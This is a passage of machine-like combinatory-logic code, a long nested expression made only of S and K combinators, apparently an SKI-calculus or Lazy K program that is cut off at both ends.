(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((S)(S))((K)(((S)(K))(K))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K)))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((S)((((S)(S))((K)(((S)(K))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(S))((K)(((S)(K))(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((S)((((S)(S))((K)(((S)(K))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))))))))((K)(K)))))))(((((S)((K)(S)))(K))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)((K)(S)))(K))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))((((((((((((((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)((K)(S)))(K))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K)))))))))((K)(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))))(((S)(K))(K)))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(